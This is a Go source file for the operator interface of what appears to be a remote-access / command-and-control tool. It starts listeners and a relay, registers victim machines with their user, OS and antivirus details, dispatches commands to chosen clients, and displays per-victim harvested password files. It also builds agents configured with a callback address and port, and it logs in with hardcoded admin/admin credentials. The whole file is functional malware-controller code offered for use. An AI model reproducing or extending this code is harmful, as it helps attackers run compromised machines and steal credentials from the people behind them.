package main

import (
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/whiterabb17/greatwhite/modules/handlers"
	"github.com/whiterabb17/greatwhite/modules/models"

	"github.com/asticode/go-astikit"
	"github.com/asticode/go-astilectron"
	bootstrap "github.com/asticode/go-astilectron-bootstrap"
	gophersocket "github.com/whiterabb17/gopher-socket"
	"github.com/whiterabb17/gopher-socket/transport"
)

var RelayServer *gophersocket.Server
var RelayChannel *gophersocket.Channel

func relayServer() {
	server := gophersocket.NewServer(transport.GetDefaultWebsocketTransport())
	server.On(gophersocket.OnConnection, func(c *gophersocket.Channel) {
		RelayChannel = c
		c.Emit("testRelay", models.Resp{Resp: "relayTest", Tag: "relayServer"})
	})
	serveMux := http.NewServeMux()
	serveMux.Handle("/socket.io/", RelayServer)
	log.Println("Starting Middleware Relay \n\n\n")
	log.Println(http.ListenAndServe(":55555", serveMux))
}
func listenHandlers(w *astilectron.Window) {
	w.OnMessage(func(m *astilectron.EventMessage) interface{} {
		// Unmarshal
		var s string
		m.Unmarshal(&s)

		// Process message
		if s == "netmap" {
			if len(handlers.NodeFarm) > 0 {
				for _, node := range handlers.NodeFarm {
					s = node.Name + "@" + strconv.Itoa(node.Port) + "|"
				}
				return s
			}
		}
		return ""
	})
}
func write(logmsg string) {
	_, er := os.Stat(".listeners")
	if er != nil {
		log.Println(er)
	} else {
		f, err := os.OpenFile(".listeners",
			os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			log.Println(err)
		}
		defer f.Close()
		f.WriteString(logmsg + "\n")
	}
}
func handleListeners(w *astilectron.Window, m bootstrap.MessageIn) (payload interface{}, err error) {
	switch m.Name {
	case "netmap":
		var vars string
		if len(m.Payload) > 0 {
			// Unmarshal payload
			if err = json.Unmarshal(m.Payload, &vars); err != nil {
				payload = err.Error()
				return
			}
		}
		new := &models.Packet{
			Event:   "netmap",
			Message: "netmap",
		}
		ServerClient.Channel.Emit("netmap", new)
		payload = "Requested"
		return
	case "ports":
		var vars string
		if len(m.Payload) > 0 {
			// Unmarshal payload
			if err = json.Unmarshal(m.Payload, &vars); err != nil {
				payload = err.Error()
				return
			}
		}
		if err := bootstrap.SendMessage(models.ListenerWindow, "ports", vars); err != nil {
			err = fmt.Errorf("Failed to start the Node\n\tError: %w", err)
		}
	case "startport":
		var vars string
		if len(m.Payload) > 0 {
			// Unmarshal payload
			if err = json.Unmarshal(m.Payload, &vars); err != nil {
				payload = err.Error()
				return
			}
		}
		node := strings.Split(vars, "@")
		write(vars)
		ServerClient.Channel.Emit("newListener", models.Packet{Event: node[0], Message: node[1]})
		NewNotification(fmt.Sprintf("Listener Name: %s\nListening Port: %s", node[0], node[1]), "Listener Started")
		if err := bootstrap.SendMessage(models.ListenerWindow, "started", "successfully"); err != nil {
			err = fmt.Errorf("Failed to start the Node\n\tError: %w", err)
		}
	case "portmap":
		var vars string
		if len(m.Payload) > 0 {
			// Unmarshal payload
			if err = json.Unmarshal(m.Payload, &vars); err != nil {
				payload = err.Error()
				return
			}
		}
		pots := strings.Split(vars, "|")
		for _, r := range pots {
			if r != "" {
				ports := strings.Split(r, "@")
				type PortStruct struct {
					Name string `json:"name"`
					Port string `json:"port"`
				}
				newp := &PortStruct{
					Name: ports[0],
					Port: ports[1],
				}
				if err := bootstrap.SendMessage(models.ListenerWindow, "portmap", newp); err != nil {
					err = fmt.Errorf("Failed to start the Node\n\tError: %w", err)
				}
			}
		}
	}
	return
}

func handleLogs(window *astilectron.Window, m bootstrap.MessageIn) (payload interface{}, err error) {
	switch m.Name {
	case "addLog":
		var tokens string
		if len(m.Payload) > 0 {
			// Unmarshal payload
			if err = json.Unmarshal(m.Payload, &tokens); err != nil {
				payload = err.Error()
				return
			}
		}
		// Explore
		if err := bootstrap.SendMessage(models.LogWindow, "addLog", tokens, func(m *bootstrap.MessageIn) {
			// Unmarshal payload
			var s string
			if err := json.Unmarshal(m.Payload, &s); err != nil {
				log.Println(fmt.Errorf("unmarshaling payload failed: %w", err))
				return
			}
			log.Printf("About modal has been displayed and payload is %s!\n", s)
		}); err != nil {
			log.Println(fmt.Errorf("sending about event failed: %w", err))
		}
		payload = err.Error()
		return
	case "close":
		models.LogWindow.Hide()
		return
	default:
		bootstrap.SendMessage(models.LogWindow, "Error", "Invalid Request send to the server.\n\t [*] "+m.Name)
	}
	return
}

const fmtInfo = " SocketID:\t %s\n IP Address:\t   %s\n Computer name:\t%s\n Username:\t\t [%s]\n Operating System: %s %s\n " +
	"CPU:\t\t      %s\n GPU:\t\t      %s\n Memory:\t\t   %s\n AV:\t\t       %s\n"

func formatInf(info models.ClientInfo) string {
	//avs := "[!] Reimplementing this Logic"
	cfg := fmt.Sprintf(fmtInfo, info.SocketID,
		info.IPAddr, info.Hostname, info.User, info.OS,
		info.Arch, info.CPU, info.GPU, info.Memory,
		info.AntiVirus,
	)
	return cfg
}

// handleMessages handles messages
func handleMessages(_ *astilectron.Window, m bootstrap.MessageIn) (payload interface{}, err error) {
	go func() { relayServer() }()
	switch m.Name {
	case "repl":
		// Unmarshal payload
		var reply string
		if len(m.Payload) > 0 {
			// Unmarshal payload
			if err = json.Unmarshal(m.Payload, &reply); err != nil {
				payload = err.Error()
				return
			}
			if err := bootstrap.SendMessage(models.MainWindow, "Reply", reply); err != nil {
				err = fmt.Errorf("sending check.out.menu event failed: %w", err)
			}
			return
		}
	case "password":
		var reply string
		if len(m.Payload) > 0 {
			// Unmarshal payload
			if err = json.Unmarshal(m.Payload, &reply); err != nil {
				payload = err.Error()
				return
			}
			models.WindowOpts = nil
			models.WindowOpts = returnPassWindow()
			varr, er := models.CreateWindow(models.WindowOpts)
			if er != nil {
				log.Println(er)
			}
			models.PassWinCreated = true
			models.PassWindow = varr[0]
			time.Sleep(5 * time.Second)
			filebuffer, er := ioutil.ReadFile("./" + reply + "/passwords.txt")
			if err != nil {
				log.Fatal(err)
			}
			var inputdata string = string(filebuffer)
			SendToFrontend(models.PassWindow, "passwords", inputdata)
			return
		}
	case "toClient":
		var vars string
		if len(m.Payload) > 0 {
			// Unmarshal payload
			if err = json.Unmarshal(m.Payload, &vars); err != nil {
				payload = err.Error()
				return
			}
		}
		node := strings.Split(vars, "#")
		ServerClient.Channel.Emit("sendToClient", models.ToClient{Command: node[0], Data: node[1], Tag: node[2]})
		NewNotification(fmt.Sprintf("Command: %s\nArgs: %s", node[0], node[1]), fmt.Sprintf("Sending to %s", node[2]))
	case "newClient":
		var reply string
		if len(m.Payload) > 0 {
			// Unmarshal payload
			if err = json.Unmarshal(m.Payload, &reply); err != nil {
				payload = err.Error()
				return
			}
			if err := bootstrap.SendMessage(models.MainWindow, "newClient", reply); err != nil {
				err = fmt.Errorf("sending check.out.menu event failed: %w", err)
			}
			return
		}
	case "register":
		var info models.ClientInfo
		if err = json.Unmarshal(m.Payload, &info); err != nil {
			payload = err.Error()
			return
		}
		infoStr := formatInf(info)
		if err := bootstrap.SendMessage(models.MainWindow, "NewRegsitration", infoStr); err != nil {
			err = fmt.Errorf("sending check.out.menu event failed: %w", err)
		}
		return
	case "reg":
		var vars string
		if err = json.Unmarshal(m.Payload, &vars); err != nil {
			payload = err.Error()
			return
		}
		//
		// Implement logic to sort registration results into a viewable table
		if err := bootstrap.SendMessage(models.MainWindow, "Regsitration Details", vars); err != nil {
			err = fmt.Errorf("sending check.out.menu event failed: %w", err)
		}
		return
	default:
		if err := bootstrap.SendMessage(models.MainWindow, "Unknown", "Unknown Packet Recieved"); err != nil {
			err = fmt.Errorf("sending check.out.menu event failed: %w", err)
		}
	}
	return
}

func checkLogin(data []string) (retVal models.Packet, err error) {
	if data[2] == "admin" && data[3] == "admin" {
		retVal = models.Packet{
			Event:   "okay",
			Message: "okay",
		}
		err = nil
		NewNotification("Login was Successful", "Login")
		return
	} else {
		if err := bootstrap.SendMessage(models.LoginWindow, "invalid", "invalid login details"); err != nil {
			log.Println(fmt.Errorf("sending check.out.menu event failed: %w", err))
		}
		err = errors.New("invalid login details")
		return
	}
}
func handleServer(w *astilectron.Window, m bootstrap.MessageIn) (payload interface{}, err error) {
	switch m.Name {
	case "login":
		var vars string
		if len(m.Payload) > 0 {
			// Unmarshal payload
			if err = json.Unmarshal(m.Payload, &vars); err != nil {
				payload = err.Error()
				return
			}
		}
		data := strings.Split(vars, "#")
		if payload, err = checkLogin(data); err != nil {
			payload = err.Error()
			return
		}
		var local bool
		if data[4] == "true" {
			local = true
		} else {
			local = false
		}
		if ConnectToTeamServer(data[0], data[1], data[2], data[3], local) {
			models.MainWindow.Show()
			models.LoginWindow.Hide()
			if !local {
				go handleTeamServer(ServerClient)
			}
		}
	}
	return
}

/*
	func sendBackToFrontend(event string, message interface{}) {
		if err := bootstrap.SendMessage(models.ListenerWindow, event, message, func(m *bootstrap.MessageIn) {
			// Unmarshal payload
			var s string
			if err := json.Unmarshal(m.Payload, &s); err != nil {
				log.Println(fmt.Errorf("unmarshaling payload failed: %w", err))
				return
			}
			log.Printf("About modal has been displayed and payload is %s!\n", s)
		}); err != nil {
			log.Println(fmt.Errorf("sending about event failed: %w", err))
		}
	}
*/

func NewNotification(message, title string) {
	// Create the notification
	var n = models.App.NewNotification(&astilectron.NotificationOptions{
		Body:             message,
		HasReply:         astikit.BoolPtr(true), // Only MacOSX
		Icon:             "static/imgs/Necromancer.png",
		ReplyPlaceholder: "type your reply here", // Only MacOSX
		Title:            title,
	})

	// Add listeners
	n.On(astilectron.EventNameNotificationEventClicked, func(e astilectron.Event) (deleteListener bool) {
		log.Println("the notification has been clicked!")
		return
	})
	// Only for MacOSX
	n.On(astilectron.EventNameNotificationEventReplied, func(e astilectron.Event) (deleteListener bool) {
		log.Printf("the user has replied to the notification: %s\n", e.Reply)
		return
	})

	// Create notification
	n.Create()

	// Show notification
	n.Show()
}

func buildHandler(w *astilectron.Window, m bootstrap.MessageIn) (payload interface{}, err error) {
	switch m.Name {
	case "build":
		var packet string
		if len(m.Payload) > 0 {
			// Unmarshal payload
			if err = json.Unmarshal(m.Payload, &packet); err != nil {
				payload = err.Error()
				return
			}
			buildVars := strings.Split(packet, "#")
			log.Println(buildVars)
			er := buildGo(buildVars[0], buildVars[1])
			if er != nil {
				payload = er.Error()
			} else {
				payload = "success"
			}
			return
		}
		return
	case "close":
		models.BuildWindow.Hide()
		return
	}
	return
}

type BuildConfig struct {
	Config []AgentConfig
}

type AgentConfig struct {
	Addr string `json:"addr"`
	Port string `json:"port"`
	OS   string `json:"os"`
}
